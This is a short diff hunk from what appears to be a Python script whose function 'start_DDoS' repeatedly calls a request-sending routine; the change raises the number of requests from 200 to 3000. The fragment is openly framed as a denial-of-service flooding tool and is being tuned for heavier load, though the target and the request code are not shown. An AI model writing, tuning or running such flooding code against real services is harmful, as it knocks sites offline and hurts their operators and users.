@@ -20,4 +20,4 @@ def start_DDoS(number_of_requests):
 	for i in range(number_of_requests):
 		send_post()
 		print('==>',i)
-start_DDoS(200)
+start_DDoS(3000)
